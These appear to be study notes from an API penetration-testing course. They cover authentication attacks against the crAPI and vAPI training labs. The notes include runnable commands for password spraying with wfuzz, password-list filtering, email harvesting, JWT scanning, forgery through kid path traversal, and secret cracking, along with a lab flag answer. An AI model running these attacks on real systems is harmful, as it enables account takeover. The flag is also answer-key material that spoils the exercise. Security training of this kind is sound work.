# Authentication Attacks  

>[Introduction to Authentication Attacks](https://university.apisec.ai/products/api-penetration-testing/categories/2150251352/posts/2161556362)  

## Classic Authentication Attacks  

>[Classic Authentication Attacks](https://university.apisec.ai/products/api-penetration-testing/categories/2150251352/posts/2157505645)  

>Password Brute-Force Attacks  

>Information about creating targeted password lists:  

* [Mentalist](https://github.com/sc0tfree/mentalist)  
* [Common User Passwords Profiler](https://github.com/Mebus/cupp)  

>Get words matching complex password policy of target, bash script:  

```bash
#!/bin/bash

# Input and output file names
input_file="/usr/share/wordlists/rockyou.txt"
output_file="complex-passwords-uniq-sorted-0955.txt"
temp_file="temp-results.txt"

# Set locale to C to avoid issues with multibyte characters in rockyou.txt
export LC_ALL=C

# Clear the temp file if it already exists to avoid duplicate entries
> "$temp_file"

# Use awk to match words that meet all specified conditions and append to temp file
awk '{
  for (i = 1; i <= NF; i++) {
    word = $i
    if (length(word) >= 8 && 
        word ~ /[A-Z]/ && 
        word ~ /[a-z]/ && 
        word ~ /[0-9]/ && 
        word ~ /[!@#$%^&*()_+{}\[\]:;<>,.?~\\/-]/) {
      print word >> "'"$temp_file"'"
    }
  }
}' "$input_file"

# Append sorted unique words from temp file to output file without overwriting
sort "$temp_file" | uniq >> "$output_file"

# Remove duplicate lines in output file to ensure all entries are unique
sort -u "$output_file" -o "$output_file"

# Remove the temporary file after processing
rm "$temp_file"

# Output message
echo "Unique sorted words matching the complex password policy conditions saved to $output_file."
```  

>Password Spraying, using `wfuzz` against the API web application endpoint:  

```
wfuzz -d '{"email":"a@email.com","password":"FUZZ"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/rockyou.txt -u http://127.0.0.1:8888/identity/api/auth/login --hc 405
```  

>The `--hc` option hides responses with certain response codes. 
>`–hc` option helps you filter out the responses you don’t want to see.  
>The `-H` option add a header to the request. API respond with an HTTP 415 Unsupported Media Type error, if you don’t include the `Content-Type:application/json` header.  

>Sample of passwords to be used during password spray attack:  

```
QWER!@#$
Password1!
Winter2021!
Spring2021?
Fall2021!
Autumn2021?
Summer2022!
Spring2022!
QWER!@#$
March212006!
July152006!
Twitter@2022
JPD1976!
Dorsey@2022
```  

>Extract emails, with regular expressions to pull emails from the saved JSON response.  

>If the output in Burp is too large for the response window, then copy the request into `curl` command and save output to `response.json`  

```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: 127.0.0.1:8888' -H $'sec-ch-ua-platform: \"Linux\"' -H $'Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0MUB0ZXN0LmNvbSIsImlhdCI6MTczMDI3NjkyNCwiZXhwIjoxNzMwODgxNzI0LCJyb2xlIjoidXNlciJ9.ZWyuFqX5-mkyY4i-Iiwk8lnHWR_TJmw0wEOuhODqyRce94JSAc6BdZaDAr6V5QfQpeBJ3LL6rx3e46hRGf2_0CEtHanSvpMqRvxRLMhsgXqkylczWVG1rMEU6tC_4mK3WTx7JeGRsJGBcCaehbAO23f6Vw5s4uVhTGvracy-mO_Qc89nJBdm37S2SVpUfZtgMV_PceIExlg_ZVFJi9xA4ARtaUp8Edh_Q6vO9CePllB_77j7FsbXa1hEa1-bnY1AO2muBMYUEweptjsy30WGWfIm-YsaVy4pM4Ttvjx5LlFTXqTUiXvIJwL9_kiic2rQbsq6ZFJKlV0YSjT3vEXC9A' -H $'Accept-Language: en-US,en;q=0.9' -H $'sec-ch-ua: \"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"130\"' -H $'Content-Type: application/json' -H $'sec-ch-ua-mobile: ?0' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36' -H $'Accept: */*' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: http://127.0.0.1:8888/forum' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: keep-alive' \
    $'http://127.0.0.1:8888/community/api/v2/community/posts/recent?limit=30&offset=0' > response.json
```  

>Get email values from response file using grep:  

```
grep -oe "[a-zA-Z0-9._]\+@[a-zA-Z]\+.[a-zA-Z]\+" response.json
```  

>Note on Base64 Encoding  

>Using Burp Suite Professional, ***Payloads*** window add a `Payload processing` rule.  
>Select `Add > Encoded > Base64-encode` and then click OK.  

----  

## API Token Attacks  

>[API Token Attacks - API Authentication Attacks](https://university.apisec.ai/products/api-penetration-testing/categories/2150251352/posts/2157505646)  

### Token Analysis  

>Change ***Postman*** custom proxy to send requests to Burp Suite `127.0.0.1:8080`  

>Capture the login POST request, `http://127.0.0.1:8888/identity/api/auth/login`, and send it to Burp Sequencer:  

![crapi-burp-sequencer-custom-location-in-response.png](/images/crapi-burp-sequencer-custom-location-in-response.png)  

>Start Live Capture, using the crAPI Burp Sequencer with the custom location of the JWT token value.  

![crAPI burp sequencer results-20000](/images/crapi-burp-sequencer-results-20000.png)  

### Automating JWT attacks with JWT_Tool  

>JWT tool scanning mode playbook:  

>Download copy of wordlist for JWT attacks: [jwt-common.txt](https://raw.githubusercontent.com/ticarpi/jwt_tool/refs/heads/master/jwt-common.txt)  

```
jwt_tool -t http://127.0.0.1:8888/identity/api/v2/vehicle/vehicles -rh 'Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0MUB0ZXN0LmNvbSIsImlhdCI6MTczMDI4NjM5MSwiZXhwIjoxNzMwODkxMTkxLCJyb2xlIjoidXNlciJ9.if-KPemRJ5ze7rqiZPWuY7ZvY9xo-ACeFrd0P0Z_-s7NjG18I22hjl5rWgF9uheq9c7vOqLys-OQcNYp87cr-RBVOsDbDIzsnjmhgH4MDLjzR7XJMaxbZu4vRRzoDmi54yLebhvWeTdMNf8HlYvnZvMhSzvsj9GMKBbI926SfoDEx71BzR23pQg27ekNg6s4Ige5IpvLP3m1rv94kyrMjGsxqHev-fYlS3IrpxM1maAPNPT_j-AGwtgWxt9VtZtx-nsztxY-TUAEAU7_mnPMfE27U_KfnU0IutQja-z1oXDxEIZ__7rqFGLWW1sYQ6C-0OefRAJ-i1T9HC7fwAF6Sw' --mode pb
```    

>JWT tool attack mode: null

```
jwt_tool -X a -t http://127.0.0.1:8888/identity/api/v2/vehicle/vehicles -rh 'Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0MUB0ZXN0LmNvbSIsImlhdCI6MTczMDI4NjM5MSwiZXhwIjoxNzMwODkxMTkxLCJyb2xlIjoidXNlciJ9.if-KPemRJ5ze7rqiZPWuY7ZvY9xo-ACeFrd0P0Z_-s7NjG18I22hjl5rWgF9uheq9c7vOqLys-OQcNYp87cr-RBVOsDbDIzsnjmhgH4MDLjzR7XJMaxbZu4vRRzoDmi54yLebhvWeTdMNf8HlYvnZvMhSzvsj9GMKBbI926SfoDEx71BzR23pQg27ekNg6s4Ige5IpvLP3m1rv94kyrMjGsxqHev-fYlS3IrpxM1maAPNPT_j-AGwtgWxt9VtZtx-nsztxY-TUAEAU7_mnPMfE27U_KfnU0IutQja-z1oXDxEIZ__7rqFGLWW1sYQ6C-0OefRAJ-i1T9HC7fwAF6Sw'
```  

>Create a wordlist for brute forcing of JWT token secret using `crunch`  

>Use Crunch, a password-generating tool, to create a list of all possible character combinations to use against crAPI.  

```
crunch 5 5 -o crAPIpw.txt
```  

>Crack JWT secret password, fails.
>JWT is using an RSA asymmetric hashing algorithm, using SHA256, this is a major change from the earlier version of crAPI that used an HMAC symmetric hashing algorithm along with a pretty easy secret to crack).  

```
jwt_tool eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0MUB0ZXN0Lx <snip> eVpTeFReatAeFEBTkQSGaFN8FQlDwSBPWnXMcA -C -d crAPIpw.txt
```  

### Key ID (kid) path traversal attack  

```
jwt_tool <jwt token> -T -S hs256 -p AA==
```  

>`-T` is the tamper command (to edit the content of the JWT)  
>`-S` hs256 is to encode the token using an HS256 algorithm  
>`-p` `AA==` is to sign the token with the secret: `AA==`  

```
jwt_tool 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0MUB0ZXN0LmNvbSIsImlhdCI6MTczMDI4OTM5NSwiZXhwIjoxNzMwODk0MTk1LCJyb2xlIjoidXNlciJ9.gDKuSWKWReVylR-9HGx9f_7Zxdzgyvge1S5xXbMh1wfZrHS6xDF6XlDPyGuznfjqCPMEvF9A8wfbppJUISWqBYQZDjYgATFtk0akpm7xBBHqg24IEDerq9RA3iCVNGmJaWcIVcu07hMyd3ndsnnuKfJjlyI4_ZvSra2QZawZpT72dFe030Wc9zepaXHopYA-1XdK7qsujqGzbjbNSw2khtyDcgJ1HgxRJ1f_J1mB58CX12X4qNUFRATvV2o1J68hXrl0zuNNuB3KI_AsDKAzeN4F-iK__2WLOZrT9RJTri43enQ6h6zBQ3tO9vwHAxwgeD_F79vnqu8IT5MeptDWOg' --tamper --sign hs256 --password AA==
```  

– change the algorithm from RS256 to HS256
– in the token’s header section, add a new parameter called kid and include this value: `../../../../../../dev/null`
– sign the token using this secret: AA==  


>[crapi Challenge 15 – Find a way to forge valid JWT Tokens](https://github.com/OWASP/crAPI/blob/7ceb7fa890f5376fdccacc2346c9d2f32097c59f/docs/challengeSolutions.md#challenge-15---find-a-way-to-forge-valid-jwt-tokens)  

>***Unsolved***  

>Password spraying is a classic authentication attack where an attacker will, Attempt to authenticate using a long list of users and a short list of targeted passwords.  

----  

## API Authentication Attacks Assessment  

>The following resources are helpful when testing vAPI for API authentication weaknesses. 

>[vapi Resources API2 Credential Stuffing](https://github.com/roottusk/vapi/blob/master/Resources/API2_CredentialStuffing/creds.csv)  

When using the credentials found in API2_CredentialStuffing to attack http://vapi.apisec.ai/vapi/api2/user/login, these three email domain names were compromised:  

```
yahoo.com
ortiz.com
beatty.info
```  

>Which of the following is the flag for sending a successful GET request to http://vapi.apisec.ai/vapi/api2/user/details?  

```
flag{api2_6bf2beda61e2a1ab2d0a}
```  

----  
